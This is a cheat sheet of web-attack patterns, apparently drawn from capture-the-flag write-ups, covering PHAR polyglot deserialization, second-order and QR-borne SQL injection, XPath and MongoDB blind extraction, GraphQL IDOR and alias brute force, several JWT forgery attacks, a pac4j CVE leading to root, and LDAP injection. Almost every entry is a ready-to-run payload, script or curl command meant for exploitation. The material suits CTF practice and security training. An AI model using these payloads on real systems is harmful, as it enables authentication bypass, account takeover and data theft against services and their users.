# Writeup-Distilled Patterns W13–W24 — deser / second-order / JWT / LDAP

## W13 — PHAR-JPG polyglot + filesystem-function trigger
Signals: upload accepts JPG, avatar loaded via `?avatar=<name>`, `s=p` toggles `phar://` vs `file://`, or any `file_exists/md5_file/filesize` on user path.
Steps: 1) `php -d phar.readonly=0 make.php` with JPG stub `<?php __HALT_COMPILER(); ?>` + metadata gadget; 2) upload as `.jpg`; 3) `GET avatar.php?avatar=phar://<uploaded>` (or `s=p`).
```php
$phar=new Phar('x.phar'); $phar->startBuffering(); $phar->addFromString('t.txt','t');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>"); $phar->setMetadata($obj); $phar->stopBuffering();
```
Pitfalls: `phar.readonly=On` blocks local build — set flag; PHP8+ kills most deser — check version first; JPG stub must survive re-encode.
Sources: https://ctftime.org/writeup/26149 | https://ctftime.org/writeup/11896 | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

## W14 — Second-order register→profile SQLi
Signals: `/register` parameterized INSERT but `/profile` does `f"SELECT ... WHERE username='{username}'"`, profile renders username + timestamp.
Steps: 1) register user `' UNION SELECT flag,CURRENT_TIMESTAMP FROM flags WHERE '1'='1`; 2) login; 3) view `/profile` — injection fires on read, not write.
```bash
curl -sS -X POST $URL/register -d "user=' UNION select flag,CURRENT_TIMESTAMP from flags where '1'='1&pass=x"
curl -sS -b jar.txt $URL/profile | grep -oiE 'flag[^<]{0,80}'
```
Pitfalls: `created_at` must be valid timestamp — select `CURRENT_TIMESTAMP`; write-path tests show nothing — always check read paths.
Sources: https://metactf.com/blog/flash-ctf-second-breakfast | https://www.usenix.org/sites/default/files/conference/protected-files/sec14_slides_dahse.pdf

## W15 — QR-PDF second-order SQLi with hash link
Signals: C#/.NET ticket API, `/upload` PDF + QR decode, `/verify` SQL with `hash` column, GUID check on first field.
Steps: 1) make `exploit.pdf` QR `%' and hash='admin-needs-no-hash`, upload, note hash H1; 2) make `inject.pdf` QR `<uuid>', 'H1'); --`, upload; 3) verify to trigger union on linked hash.
```bash
curl -sS -X POST $URL/upload -F file=@inject.pdf
curl -sS -X POST $URL/verify -F file=@extract.pdf | grep -oE '[A-Za-z0-9_]{3,}\{[^}]{0,80}\}'
```
Pitfalls: QR must decode byte-exact — test locally first; hash links the two stages — order matters.
Sources: https://ctftime.org/writeup/38779 | https://www.cqql.site/ctf/2024/1753ctf/ticket_api.html

## W16 — XPath `contains()` blind oracle
Signals: login says "no unsafe query languages", hint XPath, truthy=`right track` vs falsy=`Login failed`.
Steps: 1) `name=' or //*[contains(.,'picoCTF{')] or 'x'='` to confirm; 2) incremental `starts-with`/`contains` brute over flag charset.
```python
inj="' or //*[contains(.,\"%s\")] or 'x'='"
for ch in ascii_letters+digits+"_}":
    if "right track" in requests.post(URL,data={'name':inj%(flag+ch),'pass':'x'}).text: flag+=ch; break
```
Pitfalls: must neutralize other OR branches; `starts-with(text(),...)` vs `contains(.,...)` differ on node sets — try both.
Sources: https://ctftime.org/writeup/27161 | https://ctftime.org/writeup/27158

## W17 — Mongo `$where` JS-break + binary-search exfil
Signals: Flask+Mongo, `/api/search {"search":"..."}`, query `f"this.challenge.includes('{q}')"` or regex `/<q>/i` eval, 500 on quote.
Steps: 1) confirm with `') == true == ('` vs `') == false == ('`; 2) exception-oracle `a/&&((COND)?(()=>{throw 1})():1)&&/a` → `database error` = true; 3) `charCodeAt(i)` binary search on hidden field.
```bash
curl -sS -X POST $URL/api/search -H 'Content-Type: application/json' -d '{"search":"'"'"') == (1==1) == ('"'"'"}'
```
Pitfalls: `$ne` auth bypass ≠ exfil — switch to `$where` for blind; regex `/` breaks out — escape carefully; sort + project to avoid huge docs.
Sources: https://ctftime.org/writeup/37163 | https://ctftime.org/writeup/37166 | https://ctftime.org/writeup/40575

## W18 — GraphQL Relay global-ID `node()` IDOR
Signals: IDs look b64 (`UHJvZHVjdDpwMQ==` → `Product:p1`), `about` leaks hex hint, introspection off but `__typename` allowed.
Steps: 1) `{"query":"{ about }"}` then `{"query":"{ products { id name } }"}`; 2) `echo ID|base64 -d` to learn `Type:raw` shape; 3) forge `Admin:<guess>` b64, `{"query":"query($id:ID!){node(id:$id){__typename ... on Admin{flag}}}"}` with localhost-mask header.
```bash
echo 'UHJvZHVjdDpwMQ==' | base64 -d
curl -sS -X POST $URL/gql -H 'Content-Type: application/json' -d '{"query":"{ node(id:\"QWRtaW46MQ==\") { __typename } }"}'
```
Pitfalls: type name guess is the crux — use `about`/error suggestions; `node` may need staff header (`X-Forwarded-For: 127.0.0.1`).
Sources: https://medium.com/@Debug_4n6/is-this-good-graphql-ctf-write-up-33917f146c4a | https://book.jorianwoltjer.com/web/server-side/graphql

## W19 — GraphQL alias-batching auth brute
Signals: `login(username,password)` mutation, rate-limit per HTTP request (not per operation), aliases allowed.
Steps: 1) single POST with `a:login(...) b:login(...) c:login(...)` aliases; 2) only successful alias returns token; 3) cap 10 aliases/req to dodge size limits.
```json
{"query":"mutation{a:login(username:\"admin\",password:\"a\") b:login(username:\"admin\",password:\"123456\") c:login(username:\"admin\",password:\"password\")}"}
```
Pitfalls: introspection may hide `login` — fuzz via suggestions; too many aliases → 413 — batch 10.
Sources: https://book.jorianwoltjer.com/web/server-side/graphql | https://github.com/d4w0d/graphql-idor-toolkit/blob/main/docs/methodology.md

## W20 — JWT `kid` SQLi key-sign
Signals: JWT header `{"kid":"skid"}`, tampering `kid` yields SQL error, 3-column UNION hint.
Steps: 1) `kid: aaaaaaa' UNION SELECT 'key','key','key';--`; 2) set `{"username":"admin"}`; 3) sign with `key`, replay cookie.
```bash
python3 jwt_tool.py $JWT -I -hc kid -hv "aaaaaaa' UNION SELECT 'key','key','key';--" -S hs256 -p key
```
Pitfalls: column count must match — enumerate via error; HS/RS confusion is separate — try SQLi first when errors leak.
Sources: https://ctftime.org/writeup/23657 | https://github.com/jkubli/pentest-hacktricks/blob/master/pentesting-web/hacking-jwt-json-web-tokens.md

## W21 — JWT `jku`/`x5u` hosted-JWK forge
Signals: header supports `jku`/`x5u`, server fetches URL without domain check, `/admin` needs `sub=administrator`.
Steps: 1) Burp JWT-Editor new RSA key; 2) exploit-server body `{"keys":[]}` + paste public JWK; 3) header `kid=<jwk-kid>`, `jku=https://<exploit>/exploit`, `sub=administrator`, Sign (Don't modify header).
```json
{"keys":[{"kty":"RSA","e":"AQAB","kid":"<kid>","n":"<n>"}]}
```
Pitfalls: `kid` must equal hosted JWK kid; some stacks check `x5c` chain — prefer `jku`; trailing-slash URL mismatch fails fetch.
Sources: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection | https://github.com/AdityaBhatt3010/JWT-Authentication-Bypass-via-JKU-Header-Injection

## W22 — JWT RS256→HS256 with leaked public key
Signals: JWT embeds `x5c`/public key, `pub.key` recoverable, `username` flows into SQL.
Steps: 1) save `pub.key` (strip newlines!); 2) `jwt_tool.py $JWT -X k -pk public.pem` (or `-I -pc username -pv hacked`); 3) replay once.
```bash
python3 jwt_tool.py $JWT -I -pc username -pv hacked -X k -pk pub.key
```
Pitfalls: newline in PEM breaks HMAC — normalize; `jwt.io` sometimes fails where `token.dev`/jwt_tool succeeds — switch tool before giving up.
Sources: https://github.com/HHousen/hack-the-box/blob/master/Challenges/Web/Under%20Construction/README.md | https://ctftime.org/writeup/39608

## W23 — pac4j JWE public-key confusion (CVE-2026-29000)
Signals: Java `pac4j-jwt v6.0.3`, unauth `/api/auth/jwks` returns RSA `kid: enc-key-1`, JWE (not JWS) session.
Steps: 1) `curl $URL/api/auth/jwks` save key; 2) `python3 poc.py --jwks $URL/api/auth/jwks` forge `ROLE_ADMIN`; 3) `GET /api/settings` for plaintext SSH + CA, sign cert for root.
```bash
curl -sS $URL/api/auth/jwks
python3 poc.py --jwks $URL/api/auth/jwks
```
Pitfalls: JWE ≠ JWS tooling — need CVE PoC, not jwt_tool; version-gate: only <patched pac4j.
Sources: https://github.com/ledksv/Principal-HackTheBox | https://github.com/George0Papasotiriou/CVE-2026-4444-JWT-Algorithm-Confusion-via-kid-Injection

## W24 — LDAP wildcard oracle + blind extract
Signals: AD/LDAP login, `*` returns first user (e.g., technician), `&` needs URL-encode, description field may hold password.
Steps: 1) `user=*)(uid=*))(|(uid=*` auth bypass probe; 2) blind `(&(uid=admin)(description=a*))` boolean via login success; 3) script charset brute, encode `&` as `%26`.
```bash
curl -sS "$URL/login?user=*)(uid=*))(|(uid=*&pass=*"
curl -sS "$URL/login?user=admin)(description=a*))%00&pass=x"
```
Pitfalls: null-byte/`%00` handling varies; lockout on brute — use `*` prefix narrowing first.
Sources: https://medium.com/@messaadimouadh/hackthebox-analysis-writeup-e29363c4bb01 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
